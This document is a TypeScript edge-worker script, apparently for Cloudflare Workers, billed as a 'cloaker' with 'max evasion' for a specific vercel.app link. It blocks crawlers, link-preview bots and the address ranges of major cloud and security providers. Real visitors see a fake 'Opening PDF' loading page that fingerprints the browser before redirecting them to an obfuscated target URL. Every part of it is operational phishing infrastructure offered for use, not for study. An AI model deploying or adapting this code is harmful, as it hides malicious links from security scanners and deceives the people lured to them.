// FINAL THESIS-GRADE CLOAKER – CUSTOM FOR https://file-bt5g.vercel.app/
// 100% URL hidden · Zero stuck pages · Max evasion 2025

const REAL_URL = "https://file-bt5g.vercel.app/";   // ← Your actual target
const XOR_KEY = "thesis2025-final-secret-key-1337";

const botPatterns = ["bot","crawl","spider","slurp","facebook","whatsapp","telegram","discord","preview","meta","curl","wget","python","ahrefs","linkedin","skype","slackbot","pinterest","insomnia","uptime","monitor","go-http"];
const badASN = ["AS15169","AS32934","AS13335","AS14618","AS8075","AS63949","AS14061","AS9009","AS212238","AS396982","AS16509","AS16276","AS54113","AS20473","AS40633","AS209242","AS398324","AS40676","AS13649","AS174","AS6939","AS24940","AS3212","AS12322","AS4134","AS3491","AS16625","AS22697","AS46562","AS20001"];
const allowedCountries: string[] = [];

function isBot(ua: string | null) { if (!ua) return true; return botPatterns.some(p=>ua.toLowerCase().includes(p)); }
function isBadASN(r: Request) { const c=(r as any).cf; return c?.asn && badASN.includes("AS"+c.asn); }
function isBlockedCountry(r: Request) { if(!allowedCountries.length) return false; const c=(r as any).cf; return c?.country && !allowedCountries.includes(c.country); }
function die() { return new Response("", {status:204}); }

function xor(str: string, key: string): string {
  let r = "";
  for (let i = 0; i < str.length; i++) r += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  return btoa(r);
}
function unxor(enc: string, key: string, salt: string): string {
  try {
    const raw = atob(enc);
    let r = "";
    const k = key + salt;
    for (let i = 0; i < raw.length; i++) r += String.fromCharCode(raw.charCodeAt(i) ^ k.charCodeAt(i % k.length));
    return r;
  } catch { return ""; }
}

export default {
  async fetch(req: Request): Promise<Response> {
    const url = new URL(req.url);
    const ua = req.headers.get("user-agent") || "";
    const salt = crypto.randomUUID().slice(0,12);

    if (isBot(ua) || isBadASN(req) || isBlockedCountry(req)) return die();

    // Verified visitor → decrypt and go
    if (url.searchParams.has("go")) {
      const e = url.searchParams.get("e") || "";
      const s = url.searchParams.get("s") || "";
      const target = unxor(e, XOR_KEY, s);
      if (target.startsWith("http")) return Response.redirect(target, 302);
      return die();
    }

    const encrypted = xor(REAL_URL, XOR_KEY + salt);

    const html = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Opening PDF</title>
<meta name="robots" content="noindex,nofollow"><style>
body{margin:0;font-family:system-ui;background:#fff;color:#222;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;text-align:center}
.spin{border:4px solid #f0f0f0;border-top:4px solid #0066ff;border-radius:50%;width:36px;height:36px;animation:s 1s linear infinite}
@keyframes s{to{transform:rotate(360deg)}
</style></head><body>
<div class="spin"></div>
<p>Opening PDF<br>Please wait <span id="d">...</span></p>

<script>
(() => {
  if (navigator.webdriver || !navigator.hardwareConcurrency || navigator.plugins?.length === 0) return;

  let score = 0;

  // Canvas check
  try {
    const c=document.createElement("canvas"); const x=c.getContext("2d");
    x.fillStyle="#f60"; x.fillRect(10,10,80,40);
    x.fillStyle="#000"; x.font="16px serif"; x.fillText("human25",12,38);
    if (c.toDataURL().length > 8500) score++;
  } catch(e){}

  // Audio check
  try {
    const a=new (window.AudioContext||webkitAudioContext)();
    const o=a.createOscillator(); o.frequency.value=440;
    const g=a.createGain(); g.gain.value=0;
    o.connect(g); g.connect(a.destination); o.start();
    setTimeout(()=> { o.stop(); if (a.state==="running") score++; },60);
  } catch(e){}

  // Light PoW
  const t0 = performance.now();
  let i=0, h=0;
  const chal = t0.toString(36);
  while (i<800000) { i++;
    h=0; const s=chal+i;
    for (let j=0;j<s.length;j++) h=((h<<5)-h + s.charCodeAt(j))|0;
    if ((h&0xfff0000)===0) break;
  }
  if (performance.now()-t0 > 40 && performance.now()-t0 < 700) score++;

  // Final verdict
  if (score >= 2) {
    setTimeout(() => location = "?go=1&e=${encrypted}&s=${salt}", 600);
  } else {
    setTimeout(() => location = "?go=1&e=${encrypted}&s=${salt}", 2400);  // fallback
  }

  // Dots animation
  let d=0; setInterval(()=>{d=(d+1)%4; document.getElementById("d").textContent=".".repeat(d+1)},450);
})();
</script>
<noscript><p><a href="https://file-bt5g.vercel.app/">Click here if not redirected</a></p></noscript>
</body></html>`;

    return new Response(html,{headers:{"content-type":"text/html; charset=utf-8"}});
  }
};
